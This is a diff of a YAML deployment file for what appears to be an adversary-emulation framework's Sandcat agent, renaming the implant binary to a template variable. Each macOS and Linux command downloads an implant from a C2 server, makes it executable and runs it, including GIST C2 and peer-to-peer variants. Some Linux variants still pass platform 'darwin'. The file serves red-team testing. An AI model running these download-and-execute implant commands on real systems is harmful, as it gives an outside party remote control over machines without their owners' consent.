@@ -12,9 +12,9 @@
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > sandcat.go;
-          chmod +x sandcat.go;
-          ./sandcat.go -server $server -v
+          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -v
         variations:
           - description: Deploy as a blue-team agent instead of red
             command: |
@@ -29,22 +29,22 @@
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
-              chmod +x sandcat.go;
-              ./sandcat.go -c2 GIST -v
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > sandcat.go;
-              chmod +x sandcat.go;
-              ./sandcat.go -server $server -listenP2P -v
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
     linux:
       sh:
         command: |
           server="#{app.contact.http}";
-          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
-          chmod +x sandcat.go;
-          ./sandcat.go -server $server -group red -v
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -group red -v
         variations:
           - description: Deploy as a blue-team agent instead of red
             command: |
@@ -59,15 +59,15 @@
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > sandcat.go;
-              chmod +x sandcat.go;
-              ./sandcat.go -c2 GIST -v
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > sandcat.go;
-              chmod +x sandcat.go;
-              ./sandcat.go -server $server -listenP2P -v
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
     windows:
       psh:
         command: |
